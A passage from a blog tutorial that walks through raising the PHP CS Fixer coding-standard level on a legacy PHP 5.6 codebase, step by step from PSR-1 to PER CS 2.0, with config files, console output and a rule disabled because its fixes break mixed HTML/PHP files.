    -&gt;exclude('includes')
    -&gt;exclude('polices')
    -&gt;exclude('smileys')
;

return (new PhpCsFixer\Config())
    -&gt;setRules([
    ])
    -&gt;setRiskyAllowed(true)
    -&gt;setParallelConfig(ParallelConfigFactory::detect())
    -&gt;setUsingCache(true)
    -&gt;setFinder($finder)
;
</code></pre>

<p>Running it will not report any problems:</p>

<pre><code class="console">&gt; make cs-check // equivalent to: ./vendor/bin/php-cs-fixer check --verbose
PHP CS Fixer 3.85.1 Alexander by Fabien Potencier, Dariusz Ruminski and contributors.
PHP runtime: 8.4.12
Running analysis on 15 cores with 10 files per process.
Parallel runner is an experimental feature and may be unstable, use it at your own risk. Feedback highly appreciated!
Loaded config default from "/apps/qa/.php-cs-fixer.dist.php".
Using cache file ".php-cs-fixer.cache".
 43/43 [‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì] 100%


Found 0 of 43 files that can be fixed in 0.105 seconds, 18.00 MB memory used
</code></pre>

<h2 id="level-1%3A-psr-1">Level 1: PSR-1</h2>

<p>Let's add the <a href="https://cs.symfony.com/doc/ruleSets/PSR1.html">PSR-1 ruleset</a>:</p>

<pre><code class="php">&lt;?php

use PhpCsFixer\Runner\Parallel\ParallelConfigFactory;

$finder = (new PhpCsFixer\Finder())
    -&gt;in(__DIR__.'/../monolith/web')
    -&gt;exclude('ban')
    -&gt;exclude('images')
    -&gt;exclude('includes')
    -&gt;exclude('polices')
    -&gt;exclude('smileys')
;

return (new PhpCsFixer\Config())
    -&gt;setRules([
        '@PSR1' =&gt; true,
    ])
    -&gt;setRiskyAllowed(true)
    -&gt;setParallelConfig(ParallelConfigFactory::detect())
    -&gt;setUsingCache(true)
    -&gt;setFinder($finder)
;
</code></pre>

<p>This will make sure we use:</p>

<ul>
<li><a href="https://cs.symfony.com/doc/rules/php_tag/full_opening_tag.html">full opening tag</a>
(not <code>&lt;?</code> but <code>&lt;?php</code>)</li>
<li><a href="https://cs.symfony.com/doc/rules/basic/encoding.html">encoding</a>
(not BOM, UTF-8)</li>
</ul>

<p>Let's run the checks:</p>

<pre><code class="console">&gt; make cs-check
PHP CS Fixer 3.85.1 Alexander by Fabien Potencier, Dariusz Ruminski and contributors.
PHP runtime: 8.4.12
Running analysis on 15 cores with 10 files per process.
Parallel runner is an experimental feature and may be unstable, use it at your own risk. Feedback highly appreciated!
Loaded config default from "/apps/qa/.php-cs-fixer.dist.php".
Using cache file ".php-cs-fixer.cache".
 43/43 [‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì] 100%

   1) ../monolith/web/news/chemin.php (full_opening_tag)

Found 1 of 43 files that can be fixed in 0.103 seconds, 18.00 MB memory used
</code></pre>

<p>There's one file that uses <code>&lt;?</code>, to automatically fix it we run:</p>

<pre><code class="console">&gt; make cs-fix // equivalent to: ./vendor/bin/php-cs-fixer fix --verbose
PHP CS Fixer 3.85.1 Alexander by Fabien Potencier, Dariusz Ruminski and contributors.
PHP runtime: 8.4.12
Running analysis on 15 cores with 10 files per process.
Parallel runner is an experimental feature and may be unstable, use it at your own risk. Feedback highly appreciated!
Loaded config default from "/apps/qa/.php-cs-fixer.dist.php".
Using cache file ".php-cs-fixer.cache".
 43/43 [‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì] 100%

   1) ../monolith/web/news/chemin.php (full_opening_tag)

Fixed 1 of 43 files in 0.107 seconds, 18.00 MB memory used
</code></pre>

<p>And that's PSR-1 done and dusted.</p>

<h2 id="level-2%3A-psr-2">Level 2: PSR-2</h2>

<p>Time for the <a href="https://cs.symfony.com/doc/ruleSets/PSR2.html">PSR-2 ruleset</a>:</p>

<pre><code class="php">&lt;?php

use PhpCsFixer\Runner\Parallel\ParallelConfigFactory;

$finder = (new PhpCsFixer\Finder())
    -&gt;in(__DIR__.'/../monolith/web')
    -&gt;exclude('ban')
    -&gt;exclude('images')
    -&gt;exclude('includes')
    -&gt;exclude('polices')
    -&gt;exclude('smileys')
;

return (new PhpCsFixer\Config())
    -&gt;setRules([
        '@PSR2' =&gt; true,
    ])
    -&gt;setRiskyAllowed(true)
    -&gt;setParallelConfig(ParallelConfigFactory::detect())
    -&gt;setUsingCache(true)
    -&gt;setFinder($finder)
;
</code></pre>

<p>It adds about 30 new rules,
mainly regarding brace placement and indentation formatting.</p>

<p>Let's run a check:</p>

<pre><code class="console">&gt; make cs-check
Loaded config default from "/apps/qa/.php-cs-fixer.dist.php".
Using cache file ".php-cs-fixer.cache".
 43/43 [‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì] 100%

   1) ../monolith/web/calcul.php (no_closing_tag, no_trailing_whitespace, single_blank_line_at_eof)
   2) ../monolith/web/redirect.php (indentation_type, single_space_around_construct, method_argument_space, no_closing_tag, braces_position, statement_indentation, single_blank_line_at_eof)
   3) ../monolith/web/checkConnect.php (indentation_type, elseif, single_space_around_construct, no_closing_tag, no_trailing_whitespace, braces_position, statement_indentation,single_blank_line_at_eof)
   4) ../monolith/web/phpincludes/fctIndex.php (indentation_type, single_space_around_construct, method_argument_space, spaces_inside_parentheses, control_structure_braces, no_closing_tag, no_trailing_whitespace, braces_position, statement_indentation, single_blank_line_at_eof)
   5) ../monolith/web/phpincludes/topten.php (indentation_type, single_space_around_construct, no_trailing_whitespace, braces_position, statement_indentation)
   6) ../monolith/web/phpincludes/pages.php (indentation_type, no_closing_tag, statement_indentation, single_blank_line_at_eof)
   7) ../monolith/web/config/parameters.php (single_blank_line_at_eof)
   8) ../monolith/web/deconnexion.php (indentation_type, single_space_around_construct, no_closing_tag, braces_position, single_blank_line_at_eof)
   9) ../monolith/web/news/rediger_news.php (indentation_type, single_space_around_construct, no_trailing_whitespace, braces_position, statement_indentation)
  10) ../monolith/web/news/chemin.php (no_closing_tag, single_blank_line_at_eof)
  11) ../monolith/web/news/liste_news.php (indentation_type, single_space_around_construct, lowercase_keywords, braces_position, statement_indentation)
  12) ../monolith/web/phpincludes/evo.php (indentation_type, single_space_around_construct, method_argument_space, no_closing_tag, no_trailing_whitespace, braces_position, statement_indentation, single_blank_line_at_eof)
  13) ../monolith/web/phpincludes/stats.php (indentation_type, method_argument_space, statement_indentation)
  14) ../monolith/web/phpincludes/infos.php (indentation_type, single_space_around_construct, braces_position, statement_indentation)
  15) ../monolith/web/phpincludes/yeux.php (indentation_type, single_space_around_construct, method_argument_space, no_trailing_whitespace, braces_position, statement_indentation)
  16) ../monolith/web/phpincludes/inscription.php (indentation_type, single_space_around_construct, method_argument_space, spaces_inside_parentheses, braces_position, statement_indentation)
  17) ../monolith/web/phpincludes/faq.php (indentation_type, braces_position, statement_indentation)
  18) ../monolith/web/phpincludes/construction.php (indentation_type, single_space_around_construct, method_argument_space, no_spaces_after_function_name, braces_position, statement_indentation)
  19) ../monolith/web/phpincludes/recherche.php (indentation_type, single_space_around_construct, no_trailing_whitespace, braces_position)
  20) ../monolith/web/phpincludes/bd.php (braces_position, statement_indentation)
  21) ../monolith/web/phpincludes/accueil.php (indentation_type, no_trailing_whitespace, braces_position, statement_indentation)
  22) ../monolith/web/phpincludes/lire.php (indentation_type, single_space_around_construct, braces_position, statement_indentation)
  23) ../monolith/web/phpincludes/membres.php (indentation_type, single_space_around_construct, method_argument_space, no_trailing_whitespace, braces_position, statement_indentation)
  24) ../monolith/web/phpincludes/nuage.php (indentation_type, single_space_around_construct, method_argument_space, no_trailing_whitespace, braces_position, statement_indentation)
  25) ../monolith/web/phpincludes/attaque.php (indentation_type, single_space_around_construct, method_argument_space, no_closing_tag, no_trailing_whitespace, no_trailing_whitespace_in_comment, no_multiple_statements_per_line, braces_position, statement_indentation, single_blank_line_at_eof)
  26) ../monolith/web/phpincludes/confirmation.php (indentation_type, single_space_around_construct, method_argument_space, spaces_inside_parentheses, no_closing_tag, no_trailing_whitespace, braces_position, statement_indentation, single_blank_line_at_eof)
  27) ../monolith/web/phpincludes/changepass.php (indentation_type, single_space_around_construct, method_argument_space, no_spaces_after_function_name, spaces_inside_parenthes, no_trailing_whitespace, braces_position, statement_indentation)
  28) ../monolith/web/phpincludes/techno.php (indentation_type, single_space_around_construct, method_argument_space, no_spaces_after_function_name, braces_position, statement_indentation)
  29) ../monolith/web/phpincludes/newpass.php (indentation_type, single_space_around_construct, method_argument_space, no_spaces_after_function_name, spaces_inside_parentheses,no_trailing_whitespace, braces_position, statement_indentation)
  30) ../monolith/web/makeBan.php (indentation_type, single_space_around_construct, method_argument_space, no_spaces_after_function_name, spaces_inside_parentheses, no_closing_tag, braces_position, statement_indentation, single_blank_line_at_eof)
  31) ../monolith/web/index.php (indentation_type, single_space_around_construct, method_argument_space, control_structure_braces, no_trailing_whitespace, no_trailing_whitespace_in_comment, braces_position, statement_indentation)
  32) ../monolith/web/phpincludes/livreor.php (indentation_type, single_space_around_construct, no_trailing_whitespace, braces_position, statement_indentation)
  33) ../monolith/web/phpincludes/connexion.php (indentation_type, single_space_around_construct, braces_position, statement_indentation)
  34) ../monolith/web/phpincludes/boite.php (indentation_type, single_space_around_construct, method_argument_space, control_structure_braces, lowercase_keywords, no_trailing_whitespace, braces_position, statement_indentation)
  35) ../monolith/web/phpincludes/connected.php (indentation_type, single_space_around_construct, braces_position, statement_indentation)
  36) ../monolith/web/phpincludes/envoi.php (indentation_type, single_space_around_construct, method_argument_space, braces_position, statement_indentation)
  37) ../monolith/web/phpincludes/action.php (indentation_type, single_space_around_construct, method_argument_space, braces_position, statement_indentation)

Found 37 of 43 files that can be fixed in 0.207 seconds, 18.00 MB memory used

Files that were not fixed due to errors reported during linting after fixing:
   1) /apps/qa/../monolith/web/phpincludes/cerveau.php
   2) /apps/qa/../monolith/web/phpincludes/bisous.php
</code></pre>

<p>We have lots of changes,
but what I'd like to focus more on is the two errors at the end.</p>

<p>To find out what specific rules are concerned,
we can replaced <code>PSR2</code> with <a href="https://cs.symfony.com/doc/ruleSets/PSR2.html">all the individual rules it includes</a>:</p>

<pre><code class="php">&lt;?php

use PhpCsFixer\Runner\Parallel\ParallelConfigFactory;

$finder = (new PhpCsFixer\Finder())
    -&gt;in(__DIR__.'/../monolith/web')
    -&gt;exclude('ban')
    -&gt;exclude('images')
    -&gt;exclude('includes')
    -&gt;exclude('polices')
    -&gt;exclude('smileys')
;

return (new PhpCsFixer\Config())
    -&gt;setRules([
        // '@PSR2' =&gt; true,
        '@PSR1' =&gt; true,

        'blank_line_after_namespace' =&gt; true,
        'braces_position' =&gt; true,
        'class_definition' =&gt; true,
        'constant_case' =&gt; true,
        'control_structure_braces' =&gt; true,
        'control_structure_continuation_position' =&gt; true,
        'elseif' =&gt; true,
        'function_declaration' =&gt; ['closure_fn_spacing' =&gt; 'one'],
        'indentation_type' =&gt; true,
        'line_ending' =&gt; true,
        'lowercase_keywords' =&gt; true,
        'method_argument_space' =&gt; ['after_heredoc' =&gt; false, 'attribute_placement' =&gt; 'ignore', 'on_multiline' =&gt; 'ensure_fully_multiline'],
        'modifier_keywords' ['elements' =&gt; ['method', 'property']],
        'no_break_comment' =&gt; true,
        'no_closing_tag' =&gt; true,
        'no_multiple_statements_per_line' =&gt; true,
        'no_space_around_double_colon' =&gt; true,
        'no_spaces_after_function_name' =&gt; true,
        'no_trailing_whitespace' =&gt; true,
        'no_trailing_whitespace_in_comment' =&gt; true,
        'single_blank_line_at_eof' =&gt; true,
        'single_class_element_per_statement' =&gt; ['elements' =&gt; ['property']],
        'single_import_per_statement' =&gt; true,
        'single_line_after_imports' =&gt; true,
        'single_space_around_construct' =&gt; ['constructs_followed_by_a_single_space' =&gt; ['abstract', 'as', 'case', 'catch', 'class', 'do', 'else', 'elseif', 'final', 'for', 'foreach', 'function', 'if', 'interface', 'namespace', 'private', 'protected', 'public', 'static', 'switch', 'trait', 'try', 'use_lambda', 'while'], 'constructs_preceded_by_a_single_space' =&gt; ['as', 'else', 'elseif', 'use_lambda']],
        'spaces_inside_parentheses' =&gt; true,
        'statement_indentation' =&gt; true,
        'switch_case_semicolon_to_colon' =&gt; true,
        'switch_case_space' =&gt; true,
    ])
    -&gt;setRiskyAllowed(true)
    -&gt;setParallelConfig(ParallelConfigFactory::detect())
    -&gt;setUsingCache(true)
    -&gt;setFinder($finder)
;
</code></pre>

<p>Then we eliminate one rule, run the check,
and see if the error is still there, then eliminate the next rule, etc.</p>

<p>Doing so, I've identified the following rule as being the offender:</p>

<ul>
<li><a href="https://cs.symfony.com/doc/rules/whitespace/statement_indentation.html">statement_indentation</a></li>
</ul>

<p>Looking at <code>apps/monolith/web/phpincludes/cerveau.php</code>,
we can see a mix of HTML and PHP (the following is a condensed example):</p>

<pre><code class="php">  &lt;h1&gt;Cerveau&lt;/h1&gt;
  &lt;?php
  if ($_SESSION['logged'] == true)
  {
  $production = calculerGenAmour(0,3600,$nbE[0][0],$nbE[1][0],$nbE[1][1],$nbE[1][2]);
  ?&gt;
  Score : &lt;strong&gt;&lt;?php echo formaterNombre($score); ?&gt;&lt;/strong&gt; Point&lt;?php echo pluriel($score);?&gt;&lt;br /&gt;
  &lt;?php
        if ($donnees_info = mysql_fetch_assoc($sql_info))
        {
                $pseudoCible = $donnees_info2['pseudo'];
  ?&gt;
  Tu vas tenter d'embrasser &lt;strong&gt;&lt;?php echo $pseudoCible; ?&gt;&lt;/strong&gt;
  &lt;?php
        }
  }
  ?&gt;
</code></pre>

<p>This is <a href="https://github.com/PHP-CS-Fixer/PHP-CS-Fixer/issues/3702#issuecomment-396717120">a known issue</a>,
and currently PHP CS Fixer doesn't support these kind of files,
so all we can do is restore <code>PSR2</code> and then disable that one specific rule:</p>

<pre><code class="php">&lt;?php

use PhpCsFixer\Runner\Parallel\ParallelConfigFactory;

$finder = (new PhpCsFixer\Finder())
    -&gt;in(__DIR__.'/../monolith/web')
    -&gt;exclude('ban')
    -&gt;exclude('images')
    -&gt;exclude('includes')
    -&gt;exclude('polices')
    -&gt;exclude('smileys')
;

return (new PhpCsFixer\Config())
    -&gt;setRules([
        // ‚Äî‚Äî CS Rule Sets ‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî
        '@PSR2' =&gt; true,

        // ‚Äî‚Äî Overriden rules ‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî

        // [PSR2] Disabled as the fixes break the following files:
        // 1) ../monolith/web/phpincludes/bisous.php
        // 2) ../monolith/web/phpincludes/cerveau.php
        'statement_indentation' =&gt; false,
    ])
    -&gt;setRiskyAllowed(true)
    -&gt;setParallelConfig(ParallelConfigFactory::detect())
    -&gt;setUsingCache(true)
    -&gt;setFinder($finder)
;
</code></pre>

<p>Now we can fix the files running <code>make cs-fix</code>.</p>

<h2 id="level-3%3A-psr-12">Level 3: PSR-12</h2>

<p>Let's now upgrade to <a href="https://cs.symfony.com/doc/ruleSets/PSR12.html">PSR-12 ruleset</a>:</p>

<pre><code class="php">&lt;?php

use PhpCsFixer\Runner\Parallel\ParallelConfigFactory;

$finder = (new PhpCsFixer\Finder())
    -&gt;in(__DIR__.'/../monolith/web')
    -&gt;exclude('ban')
    -&gt;exclude('images')
    -&gt;exclude('includes')
    -&gt;exclude('polices')
    -&gt;exclude('smileys')
;

return (new PhpCsFixer\Config())
    -&gt;setRules([
        // ‚Äî‚Äî CS Rule Sets ‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî
        '@PSR12' =&gt; true,

        // ‚Äî‚Äî Overriden rules ‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî

        // [PSR2] Disabled as the fixes break the following files:
        // 1) ../monolith/web/phpincludes/bisous.php
        // 2) ../monolith/web/phpincludes/cerveau.php
        'statement_indentation' =&gt; false,
    ])
    -&gt;setRiskyAllowed(true)
    -&gt;setParallelConfig(ParallelConfigFactory::detect())
    -&gt;setUsingCache(true)
    -&gt;setFinder($finder)
;
</code></pre>

<p>PSR-12 extends PSR-2 with rules for modern PHP syntax,
specifically how to format newer language features like:</p>

<ul>
<li>type declarations</li>
<li>arrow functions</li>
<li>anonymous classes</li>
<li>trait usage</li>
</ul>

<p>As well as other PHP 7+ constructs that didn't exist when PSR-2 was written
(in 2012, when PHP 5.4 got released).</p>

<p>Let's run the checks:</p>

<pre><code class="console">&gt; make cs-check
PHP CS Fixer 3.85.1 Alexander by Fabien Potencier, Dariusz Ruminski and contributors.
PHP runtime: 8.4.12
Running analysis on 15 cores with 10 files per process.
Parallel runner is an experimental feature and may be unstable, use it at your own risk. Feedback highly appreciated!
Loaded config default from "/apps/qa/.php-cs-fixer.dist.php".
Using cache file ".php-cs-fixer.cache".
 43/43 [‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì] 100%

   1) ../monolith/web/calcul.php (binary_operator_spaces)
   2) ../monolith/web/redirect.php (blank_line_after_opening_tag, binary_operator_spaces, no_whitespace_in_blank_line)
   3) ../monolith/web/checkConnect.php (binary_operator_spaces, no_whitespace_in_blank_line)
   4) ../monolith/web/phpincludes/fctIndex.php (blank_line_after_opening_tag, binary_operator_spaces, no_whitespace_in_blank_line)
   5) ../monolith/web/phpincludes/topten.php (binary_operator_spaces, no_whitespace_in_blank_line)
   6) ../monolith/web/phpincludes/pages.php (blank_line_after_opening_tag)
   7) ../monolith/web/deconnexion.php (blank_line_after_opening_tag, binary_operator_spaces)
   8) ../monolith/web/news/rediger_news.php (no_whitespace_in_blank_line)
   9) ../monolith/web/news/chemin.php (blank_line_after_opening_tag)
  10) ../monolith/web/phpincludes/evo.php (binary_operator_spaces, no_whitespace_in_blank_line)
  11) ../monolith/web/phpincludes/stats.php (binary_operator_spaces, no_whitespace_in_blank_line)
  12) ../monolith/web/phpincludes/infos.php (binary_operator_spaces)
  13) ../monolith/web/phpincludes/cerveau.php (binary_operator_spaces, no_whitespace_in_blank_line)
  14) ../monolith/web/phpincludes/yeux.php (binary_operator_spaces, no_whitespace_in_blank_line)
  15) ../monolith/web/phpincludes/inscription.php (binary_operator_spaces, no_whitespace_in_blank_line)
  16) ../monolith/web/phpincludes/faq.php (binary_operator_spaces, no_whitespace_in_blank_line)
  17) ../monolith/web/phpincludes/construction.php (binary_operator_spaces)
  18) ../monolith/web/phpincludes/recherche.php (binary_operator_spaces)
  19) ../monolith/web/makeBan.php (binary_operator_spaces, no_whitespace_in_blank_line)
  20) ../monolith/web/index.php (binary_operator_spaces, no_whitespace_in_blank_line)
  21) ../monolith/web/phpincludes/livreor.php (binary_operator_spaces, no_whitespace_in_blank_line)
  22) ../monolith/web/phpincludes/bisous.php (binary_operator_spaces, no_whitespace_in_blank_line)
  23) ../monolith/web/phpincludes/boite.php (indentation_type, binary_operator_spaces, no_whitespace_in_blank_line)
  24) ../monolith/web/phpincludes/connected.php (indentation_type, binary_operator_spaces, no_whitespace_in_blank_line)
  25) ../monolith/web/phpincludes/envoi.php (binary_operator_spaces, no_whitespace_in_blank_line)
  26) ../monolith/web/phpincludes/action.php (binary_operator_spaces, no_whitespace_in_blank_line)
  27) ../monolith/web/phpincludes/accueil.php (binary_operator_spaces, no_whitespace_in_blank_line)
  28) ../monolith/web/phpincludes/lire.php (binary_operator_spaces, no_whitespace_in_blank_line)
  29) ../monolith/web/phpincludes/membres.php (binary_operator_spaces)
  30) ../monolith/web/phpincludes/nuage.php (binary_operator_spaces, no_whitespace_in_blank_line)
  31) ../monolith/web/phpincludes/attaque.php (blank_line_after_opening_tag, binary_operator_spaces, no_whitespace_in_blank_line)
  32) ../monolith/web/phpincludes/confirmation.php (binary_operator_spaces, no_whitespace_in_blank_line)
  33) ../monolith/web/phpincludes/changepass.php (binary_operator_spaces, no_whitespace_in_blank_line)
  34) ../monolith/web/phpincludes/techno.php (binary_operator_spaces)
  35) ../monolith/web/phpincludes/newpass.php (binary_operator_spaces, no_whitespace_in_blank_line)

Found 35 of 43 files that can be fixed in 0.207 seconds, 18.00 MB memory used
</code></pre>

<p>So far so good, let's apply the changes: <code>make cs-fix</code>.</p>

<p>But we are not finished here, it's time to introduce <strong>risky</strong> rules:
these are rules that once applied can potentially change the logic and behaviour of your code.</p>

<p>For example the rule <a href="https://cs.symfony.com/doc/rules/function_notation/no_unreachable_default_argument_value.html">no_unreachable_default_argument_value</a>,
will remove default values for arguments,
that come before other arguments without default values.</p>

<p>Here's the new configuration:</p>

<pre><code class="php">&lt;?php

use PhpCsFixer\Runner\Parallel\ParallelConfigFactory;

$finder = (new PhpCsFixer\Finder())
    -&gt;in(__DIR__.'/../monolith/web')
    -&gt;exclude('ban')
    -&gt;exclude('images')
    -&gt;exclude('includes')
    -&gt;exclude('polices')
    -&gt;exclude('smileys')
;

return (new PhpCsFixer\Config())
    -&gt;setRules([
        // ‚Äî‚Äî CS Rule Sets ‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî
        '@PSR12' =&gt; true,
        '@PSR12:risky' =&gt; true,

        // ‚Äî‚Äî Overriden rules ‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî

        // [PSR2] Disabled as the fixes break the following files:
        // 1) ../monolith/web/phpincludes/bisous.php
        // 2) ../monolith/web/phpincludes/cerveau.php
        'statement_indentation' =&gt; false,
    ])
    -&gt;setRiskyAllowed(true)
    -&gt;setParallelConfig(ParallelConfigFactory::detect())
    -&gt;setUsingCache(true)
    -&gt;setFinder($finder)
;
</code></pre>

<p>Running <code>make cs-check</code> will show that all is fine,
so we apply the change through <code>make cs-fix</code>,
and then we have a look at the changes made,
and test around to make sure nothing is broken.</p>

<h2 id="level-4%3A-per-cs-2.0">Level 4: PER CS 2.0</h2>

<p>Next is the <a href="https://cs.symfony.com/doc/ruleSets/PERCS2x0.html">PER CS 2.0 ruleset</a>:</p>

<pre><code class="php">&lt;?php

use PhpCsFixer\Runner\Parallel\ParallelConfigFactory;

$finder = (new PhpCsFixer\Finder())
    -&gt;in(__DIR__.'/../monolith/web')
    -&gt;exclude('ban')
    -&gt;exclude('images')
    -&gt;exclude('includes')
    -&gt;exclude('polices')
    -&gt;exclude('smileys')
;

return (new PhpCsFixer\Config())
    -&gt;setRules([
        // ‚Äî‚Äî CS Rule Sets ‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî
        '@PER-CS2x0' =&gt; true,
        '@PER-CS2x0:risky' =&gt; true,

        // ‚Äî‚Äî Overriden rules ‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî

        // [PSR2] Disabled as the fixes break the following files:
        // 1) ../monolith/web/phpincludes/bisous.php
        // 2) ../monolith/web/phpincludes/cerveau.php
        'statement_indentation' =&gt; false,
    ])
    -&gt;setRiskyAllowed(true)
    -&gt;setParallelConfig(ParallelConfigFactory::detect())
    -&gt;setUsingCache(true)
    -&gt;setFinder($finder)
;
</code></pre>

<p>As the PHP language evolves it gets new features,
which then requires the coding standards PSRs to be updated.</p>

<p>However the PSRs process where not suitable for updates,
so PER (PHP Evolving Recommendation) was created.</p>

<p>PER CS 1.0, released in 2022, is intentionally strictly equivalent to PSR-12.</p>

<p>In 2023, PER CS 2.0 was released, to cover PHP 8 new features, such as:</p>

<ul>
<li>Type declarations for properties</li>
<li>Constructor property promotion</li>
<li>Match expressions</li>
<li>Named arguments</li>
<li>Attributes</li>
<li>Readonly properties and classes</li>
<li>Enum declarations</li>
</ul>

<p>Because it is targeted at new PHP versions,
some of its rule won't be compatible with our version of PHP (5.6):</p>

<ul>
<li><a href="https://cs.symfony.com/doc/rules/control_structure/trailing_comma_in_multiline.html">trailing_comma_in_multiline</a></li>
</ul>

<p>In PHP 5.6, trailing commas are only supported with arrays,
so we need to change our configuration slightly:</p>

<pre><code class="php">&lt;?php

use PhpCsFixer\Runner\Parallel\ParallelConfigFactory;

$finder = (new PhpCsFixer\Finder())
    -&gt;in(__DIR__.'/../monolith/web')
    -&gt;exclude('ban')
    -&gt;exclude('images')
    -&gt;exclude('includes')
    -&gt;exclude('polices')
    -&gt;exclude('smileys')
;

return (new PhpCsFixer\Config())
    -&gt;setRules([
        // ‚Äî‚Äî CS Rule Sets ‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî
        '@PER-CS2x0' =&gt; true,
        '@PER-CS2x0:risky' =&gt; true,

        // ‚Äî‚Äî Overriden rules ‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî

        // [PSR2] Disabled as the fixes break the following files:
